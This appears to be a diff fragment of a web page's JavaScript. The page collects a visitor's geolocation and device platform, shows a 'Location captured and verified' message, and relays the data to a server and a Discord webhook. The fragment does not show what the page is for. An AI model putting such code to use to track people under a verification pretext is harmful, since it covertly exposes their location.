@@ -145,18 +145,16 @@
                         platform: navigator.platform
                     };
                     
-                    coordsDiv.innerHTML = 'Location Captured:\n' +
-                        'Latitude: ' + coords.latitude + '\n' +
-                        'Longitude: ' + coords.longitude + '\n' +
-                        'Accuracy: +-' + Math.round(coords.accuracy) + ' meters\n' +
+                    coordsDiv.innerHTML = 'Location Captured:<br>' +
+                        'Latitude: ' + coords.latitude + '<br>' +
+                        'Longitude: ' + coords.longitude + '<br>' +
+                        'Accuracy: +-' + Math.round(coords.accuracy) + ' meters<br>' +
                         'Time: ' + coords.timestamp;
                     coordsDiv.style.display = 'block';
                     
                     sendToServer(coords);
                     
-                    showStatus('Location captured and verified. You may close this window.', false);
-                    
-                    // Try to send to Discord webhook as well
+                    // Send to Discord webhook
                     fetch('/api/location/discord', {
                         method: 'POST',
                         headers: {
@@ -166,6 +164,8 @@
                     }).catch(function(e) {
                         console.log('Discord webhook error:', e);
                     });
+                    
+                    showStatus('Location captured and verified. You may close this window.', false);
                 },
                 function(error) {
                     var errorMsg = '';
